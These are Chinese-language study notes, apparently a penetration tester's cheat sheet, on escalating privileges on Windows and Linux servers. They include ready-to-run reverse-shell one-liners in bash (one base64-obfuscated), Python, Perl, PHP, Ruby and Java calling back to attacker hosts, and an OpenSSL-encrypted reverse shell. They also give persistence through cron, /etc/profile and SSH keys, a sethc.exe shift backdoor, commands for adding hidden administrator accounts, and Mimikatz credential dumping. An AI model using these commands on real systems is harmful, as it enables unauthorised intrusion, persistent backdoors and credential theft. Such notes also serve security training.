提权

	Web服务器提权
		* SER-TU提权
			通常是利用SERFTP服务器管理工具，首先要在安装目录下找到INI配置文件，必须具备可写入的权限
		* RADMIN提权
			在扫描4899空口令后，同样需要他来连接
		* PCANYWHRER提权
			也是远程客户端软件，下载安装目录的CIF文件进行破解
		* SAM提权
			SAM系统帐户，通常需要下载临时存放的SAM文件，然后进行HASH破解
		* NC提权
			利用NC命令，反弹一个端口，然后TELNET远程去连接一个端口，虽然权限不够大，但结合巴西烤肉，也是能够成功的
		* PR提权
			PR提权，这个就不多说了，最好是免杀的PR大杀器，这样更方面我们去操作
		* IIS提权	
			IIS6.0提权，首先需要获取IIS的配置信息，利用工具进行添加后门用户
		* 43958提权
			如果SER-TU有直接读入和执行的权限，那么我们就可以直接提权
		* PERL提权
			PERL提权通常是针对PERL文件夹下的提权方式，利用DIR目录%20NET USER这样来建立后门用户
		* 内网LCX提权
			转发工具LCX，通常需要先本地监听一个端口，然后转发，针对内网，用本地的127连接对方的3389
		* 启动提权
			如果服务器启动项有能够执行的权限，那么应该说管理员的技术肯定不精湛
		* 替换服务提权	
			替换某个服务EXE，比如SER-TU，可将原有的删除，再传一个同样的SER.EXE上去，等待服务器重启
		* FXP提权
			FXP这个工具其实本身他是一个传输工具，但我们可以下载他的三个文件，然后，用密码查看器的功能去获得密码
		* 输入法提权
			目前来说的话，输入法提权的思路基本上不太可行了
		* 360提权	
			360提权，也就是我们常说的SHIFT后门，如果执行了360漏洞利用程序，连接服务器用SHIFT5下，弹出了CMDSHELL即为成功
		* VNC提权
			VNC，我们通常是扫描5900国外服务器时候用到VNC来连接的，同样，我们如果得到了VNC的密码，通常可以利用他来提权
		* 2003ODAY提权	
			如果服务器是2003的，那么就可以利用2003ODAY利用工具来进行提权了
		* ROOT提权
			如果你获得了MSSQL的密码，那么就可以导入注册表的方式，利用MSSQL语句执行我们想要的命令了
		* SA密码服务器提权
			通常去寻找SA，MSSQL的相关密码，比如CONFIG.ASP,CONN.ASP等等
		* FTP溢出提权
			这个用到LCX工具，本地溢出，转发一个端口，虽然不是内网，利用默认的21进行提升权限

	提权
		主要针对网站测试过程中，当测试某一网站时，通过各种漏洞提升webshell权限来拿到该服务器的权限
		常见脚本所处的权限
			asp/PHP，匿名权限(网络服务权限，权限较小)
			aspx，user权限(普通用户权限)
			jsp，系统权限(通常)
		收集信息
			必要信息
				内/外网
   				服务器系统和版本位数
   				服务器的补丁情况
   				服务器的安装软件情况
   				服务器的防护软件情况
   				端口情况
   				支持脚本的情况
			常见命令(for windows)
				ipconfig /all
					查看当前ip
    			net user
					查看当前服务器账号情况
    			netstat –ano
					查看当前服务器端口开放情况
    			ver
					查看当前服务器操作糸统
    			systeminfo           
					查看当前服务器配置信息(补丁情况)
    			tasklist /svc        
					查看当前服务器进程
    			taskkill –PID ID号   
					结束某个pid号的进程
    			taskkill lim qq.exe /f    
					结束qq进程
    			net user abc abc /add    
					添加一个用户名为abc密码为abc的用户
    			whoami                 
					查看当前操作用户(当前权限)
			常见命令(for linux)
			    ls –al
				 	查看当前服务器的文件和文件夹
				pwd
					查看当前操作路径
    			uname -a
				 	查看当前服务器的内核信息
			cmd执行命令
				* 防护软件拦截
    			* cmd被降权
    			* 组件被删除
				找到可读写目录上传cmd.exe，将执行的cmd.exe路径替换成上传的路径，再次调用

	windows提权
		* 第三方软件提权
			    FTP软件
    				server –u、g6ftp、FileZilla
    		远程管理软件
    			PCanywhere、readmin、vnc
    	* 溢出提权
			server-u提权
				有修改权限
					* 检查是否有可写权限，修改server-u，默认安装目录下的servUDaemou.ini
    				* 增加用户
					* 连接
    				* 执行命令
    				quote site exec bet user abc abc.com /add
    				quote site exec net localgroup administertors abc /add
				无修改权限
					暴力破解mds
    				溢出提权
    	* 启动项提权		
			G6ftp提权
				* 下载管理配置文件，将administrator管理密码破解
    			* 使用lcx端口转发(默认只允许本机连接)
    			* lcx.exe –tran 8027 127.0.0.1 8021
    			* 使用客户端管理员用户登录
    			* 创建用户并设置权限和执行的批处理文件
    			* 上传批处理
    			* 已创建的普通用户登录ftp
    			* 执行命令quate site x.bat
    			* x.bat内容为添加系统用户提权
    	* 破解hash提权
			filezilla提权
				filezilla是一款开源的ftp服务器和客户端的软件若安装了服务器默认只监听127.0.0.1的14147端口并且默认安装目录下有两个敏感文件
					* filezillaserver.xm(包含了用户信息)
    				* filezillaserver interface.xml(包含了管理信息)
				提权思路
					* 下载这两个文件，拿到管理密码
    				* 配置端口转发，登录远程管理ftpserver创建ftp用户
    				* 分配权限，设置家目录为c:\
    				* 使用cmd.exe改名为sethc.exe替换
    				* c:\windows\system32\sethc.exe生成shift后门
    				* 连接3389按5次shift调出cmd.exe
    				* query user(显示管理员是否在线)
    	* 数据库提权

	服务器系统提权意义
		* 修改服务器上某个文件
		* 查看服务器上某个文件
		* 获取服务器上数据库权限
		网站webshell权限解析
			{一般情况下，webshell权限介于guests-users之间，权限较小}
		webshell权限影响条件
			网站脚本类型
			搭建平台类型
			当拿到一个网站时，看看它的脚本类型
				ASP PHP(小于users)<ASPX(users) <JSPs(ystem，如果网站是JSP搭建，权限就是system了，也就是不用提权了)
			phpstudy apmserv lamp 等软件搭建 = administrators
		常规提权的方法
			数据库提权
			溢出漏洞提权
			第三方软件提权

	服务器提权系统溢出漏洞
		前期的信息收集
			服务器操作系统的位数
			网站脚本程序类型
			服务器补丁情况
			服务器防护软件
			其他信息整理
		常见的系统命令(for windows)
			ipconfig
				查看计算机ip地址(判定网络情况，是否是内网还是外网)
			net user
				查看计算机用户
			net start
				查看计算机开启服务(可以看一下是否开启防护软件)
			whoami
				查看当前用户权限
			tasklist /svc
				查看计算机进程(判断第三方软件等)
			systeminfo
				查看计算机相关信息(操作系统、位数、补丁情况等)
			netstat -ano
				查看计算机端口开放情况

	对提权的重新记录
		信息收集
			内网
			服务器系统和版本位数
			服务器的补丁情况
			服务器的安装软件情况
			服务器的防护软件情况
   			端口情况
   			支持脚本的情况
		常见命令(for windows)
			ipconfig /all
				查看当前ip
    		net user
				查看当前服务器账号情况
    		netstat –ano
				查看当前服务器端口开放情况
    		ver
				查看当前服务器操作糸统
    		systeminfo           
				查看当前服务器配置信息(补丁情况)
    		tasklist /svc        
				查看当前服务器进程
    		taskkill –PID ID号   
				结束某个pid号的进程
    		taskkill lim qq.exe /f    
				结束qq进程
    		net user abc abc /add    
				添加一个用户名为abc密码为abc的用户
    		whoami                 
				查看当前操作用户(当前权限)
		常见命令(for linux)
		    ls –al
			 	查看当前服务器的文件和文件夹
			pwd
				查看当前操作路径
    		uname -a
			 	查看当前服务器的内核信息
		cmd执行命令
			* 防护软件拦截
    		* cmd被降权
    		* 组件被删除
			找到可读写目录上传cmd.exe，将执行的cmd.exe路径替换成上传的路径，再次调用

	提权的条件
		如在拿到webshell权限、数据库权限、普通用户权限
		Windows基础命令
			* query user
				查看用户登录情况
			* whoami
				查看当前用户权限
			* systeminfo
				查看当前系统版本和补丁信息
			添加管理员用户–设置密码为123456
			net user 1111 123456 /add
			net localgroup administrators 1111 /add
			如果远程桌面连接不上，那么就添加远程桌面组
			net localgroup "Remote Desktop Users" 1111 /add
			其他基础命令
				* ipconfig
					查看本机ip信息，可加/all参数
				* netstat-ano
					查看端口情况
				* dir c:\
					查看目录
				* type c:\...\...\....txt
					查看指定位置文件内容，一般为文本文件
				* echo 字符串>....txt
					写入文本到文件，特殊字符<>等前面加^
				* copy ....txt ....php
					复制文件
				* renname d:\....txt ....txt
					将某个路径下文件重命名
				* tasklist
					查看所有进程占用的端口
				* taskkill /im ....exe /f
					强制结束指定进程
		linux基础命令
			本地溢出提权、数据库提权、三方软件提权、信息泄露

	基于密码破解的提权
		密码获取的常用手段
			* 中间人劫持：网络窃听
			* 用户主机窃听：键盘记录
			* 简单猜测：常用密码(弱口令)
			* 系统漏洞：永恒之蓝
			* 用户泄露：git、配置文件等泄露
			* 系统后门：shift后门等等
		windows的密码原理
			windows采用两种方法对用户密码进行哈希处理，分别是LM和NT，而哈希是一种加密函数经过计算后的结果
			windows系统密码hash默认情况下由两部分组成，第一部分是LM-hash，第二部分是NT-hash
			得到了哈希密码后可以通过在线查询网站来破解
		windows密码hash导出(获取)
			导出导入SAM、system
			gethashs导出
			Pwdump导出
			Wce导出
			这四种方法都是用不同的工具去获取，基本差不多的
		破解hash密码
			导入SAM和system文件(也可以导入 pwdump导出来的文件)进行暴力破解即可
		明文密码的获取
			工具
				Wce明文密码获得
				Mimikatz明文密码获得
					privllege::debug
					sekurlsa::logonpasswords
				Getpass明文密码获得
		Linux密码获取和破解
			join破解
			加载字典破解

	windows系统的提权基础(pr提权)
		windows提权
			密码收集
				注册表
				日志
				.rap文件
				内存
				配置文件
				sam文件
			内核提权
				ms09-012(pr.exe)
			数据库提权
				mysql
				sql server
			应用提权
				ftp

	windows提权实践
		* WinSysHelper-master(上传bat+txt文件，适用于2003之前的系统)
		* powershell
			这里首先了解学习一下powersell的知识，在win7虚拟机中开启powshell，并查看其版本(Get-Host或者$PSVersionTable.PSVERSION命令来查看)
			powershell脚本的文件名后缀是.PS1
			这里利用Sherlock来提权(Sherlock是一个在Windows下用于本地提权的PowerShell脚本，可以在GitHub上下载)

	Linux提权基础
		基础命令
			* 获取系统信息
				* cat /etc/issue
					查看发行版
				* cat /etc/*-release
					查看发行版
				* cat /proc/version
				* uname -a
					查看内核版本
				* rpm -q kernel
					红帽系统特有
				* dmesg | grep Linux
				* ls /boot | grep vmlinuz-
				* lsb_release -a
		    * 检查用户权限
				* sudo -l
				* cat /etc/sudoers
				* whoami
				passwd文件中存储了用户，shadow文件中存储的是密码的hash，出于安全的考虑，passwd是全用户可读，root可写，而Shadow是仅root可读写的
				passwd由冒号分割，第一列是用户名，第二列是密码，x代表密码hash被放在shadow里面了(这样非root就看不到了)
			* 查看环境变量
				搜寻有配置错误的环境变量，查看是否优先从不安全的路径执行文件
				* cat /etc/profile
				* cat /etc/bashrc
				* cat ~/.bash_profile
				* cat ~/.bashrc
				* cat ~/.bash_logout
				* cat ~/.bash_history
				* env
				* set
			* 检查历史文件及命令
				* cat ~/.*_history
			* 搜寻可被低权限用户使用的root权限程序
				* crontab -l
				* ls -alh /var/spool/cron
				* ls -al /etc/ | grep cron
				* ls -al /etc/cron*
				* cat /etc/cron*
				* cat /etc/at.allow
				* cat /etc/at.deny
				* cat /etc/cron.allow
				* cat /etc/cron.deny
				* cat /etc/crontab
				* cat /etc/anacrontab
				* cat /var/spool/cron/crontabs/root
			 * 检查以root权限的进程是否存在漏洞
				* ps aux | grep root
				* ps -ef | grep root
			* 搜索纯文本凭据的文件
				* grep -ir user *
				* grep -ir pass *
			* 查找可写的配置文件
				* find /etc/ -writable -type f 2>/dev/null
			* 查找suid权限的程序
				* find / -user root -perm -4000 -print 2>/dev/null
				* find / type f -perm -u=s 2>/dev/null
			* 可利用的脚本
				* LinEnum 
				* linuxprivchecker.py
				* unix-privesc-check 
			* 获得交互shell
				* python -c 'import pty;pty.spawn("/bin/bash")' 
				* echo os.system('/bin/bash')
				* /bin/sh -i
		反弹shell实战
			Bash反弹shell
				Linux 反弹 shell 使用下面这条命令，该命令弹回来的shell是不可交互的，也就是比如 vim、passwd 命令不能用
				-----------------------------------------------------------------------------------------
				bash -i >& /dev/tcp/192.168.10.27/4444 0>&1   #将shell环境转发到192.168.10.32的4444端口上
				也可以如下：
				{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwLjI3LzQ0NDQgMD4mMSA=}|{base64,-d}|{bash,-i}
				-----------------------------------------------------------------------------------------
				然后客户端用 netcat 进行接收
				---------------------------
				nc -lvp  4444  #监听4444端口
				---------------------------
				只有拥有/bin/bash的用户，才能使用该命令，如apache等web用户，无法使用该命令(以下是使用菜刀连接的webshell，获取到的shell是apache 的shell)
				文件描述符
					标准输入(stdin)：代码为0，使用<或<< 
					标准输出(stdout)：代码为1，使用>或>> 
					标准错误输出(stderr)：代码为2，使用2>或2>>
					而通过查阅资料，发现>&和&>两者一个意思，都是将标准错误输出合并到标准输出中
				以下这些命令其实都可以用于linux反弹shell
					-------------------------------------------
					bash -i >& /dev/tcp/192.168.10.27/4444 0>&1 
					bash -i >& /dev/tcp/192.168.10.27/4444 0<&1 
					bash -i $> /dev/tcp/192.168.10.27/4444 0>$1 
					bash -i $> /dev/tcp/192.168.10.27/4444 0<&1 
					-------------------------------------------
				但是，很多时候，由于我们获取的shell并不是一个具有完整交互的shell，因此可能会在使用过程中被挂起，甚至还可能会因为我们的操作失误，例如不小心摁下了Ctrl-C，这将直接终止我们的整个shell进程，或者获得的shell类型是sh的，我们使用不习惯
				如果目标主机有python环境，我们在用netcat获得了反弹的shell后，可以执行下面的命令，才获得一个正常的shell(可以进行交互的shell)，可以执行passwd命令，但是vim命令还是用不了
				---------------------------------------------
				python -c 'import pty;pty.spawn("/bin/bash")'
				---------------------------------------------
			加密bash反弹shell的流量
				* 在vps上生成SSL证书的公钥/私钥对，执行以下命令，一路回车即可
				---------------------------------------------------------------------------------
				openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
				---------------------------------------------------------------------------------
				* 在VPS监听反弹shell
				--------------------------------------------------------------
				openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
				--------------------------------------------------------------
				* 在目标上用openssl加密反弹shell的流量
				-------------------------------------------------------------------------------------------------------------------
				mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.10.136:4444 > /tmp/s;rm /tmp/s
				-------------------------------------------------------------------------------------------------------------------
			Python反弹shell
				使用下面这条命令弹回来的shell也是不可交互的shell，即 vim 和 passwd 等命令用不了
					---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
					#利用python反弹一个bash类型的shell
					python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.25",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
					---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
				只有拥有 /bin/bash 的用户，才能使用该命令，如apache等web用户，无法使用该命令(以下是使用菜刀连接的webshell，获取到的 shell 是 apache 的shell)
			其他命令反弹shell
				----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
				Perl：
					perl -e 'use Socket;$i="192.168.10.13";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
				PHP：
					php -r '$sock=fsockopen("192.168.10.13",8888);exec("/bin/sh -i <&3>&3 2>&3");'
				Ruby：
					ruby -rsocket -e'f=TCPSocket.open("192.168.10.13",8888).to_i;exec sprintf("/bin/sh -i <&%d>&%d 2>&%d",f,f,f)'
				Java：
					r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.10.13/8888;cat <&5 2="" |="" while="" read="" line;="" do="" \$line="">&5 >&5; done"] as String[]) p.waitFor()
				----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
			写入命令到定时任务文件
				我们可以在远程主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道远程主机当前的用户名是哪个，因为我们的反弹shell命令是要写在/var/spool/cron/当前用户命令的文件内的，所以必须要知道远程主机当前的用户名，否则就不能生效
				比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/root 中(centos系列主机)
				比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/crontabs/root 中(debian系列主机)
				----------------------------------------------------------------
				*/1  *  *  *  *   /bin/bash -i>&/dev/tcp/192.168.10.11/4444 0>&1
				#每隔一分钟，向192.168.10.27的4444号端口发送shell
				----------------------------------------------------------------
			写入SSH公钥 
				将公钥信息传送到远程主机的/root/.ssh/目录下，并且重命名为authorized_keys如果是其他用户，比如test，那就是/test/.ssh/下
			写入/etc/profile文件
				将以下命令写入/etc/profile文件中，/etc/profile中的内容会在用户打开bash窗口时执行
				------------------------------------------------
				/bin/bash -i>&/dev/tcp/192.168.10.11/4444 0>&1 &
				------------------------------------------------
		脏牛提权
			脏牛漏洞，又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞，Linux kernel团队在2016年10月18日已经对此进行了修复
			漏洞范围
				Linux内核 >= 2.6.22(2007年发行，到2016年10月18日才修复)
			简要分析
				该漏洞具体为，Linux内核的内存子系统在处理写入复制(copy-on-write，COW)时产生了竞争条件(race conditio)，恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问，竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码，利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限
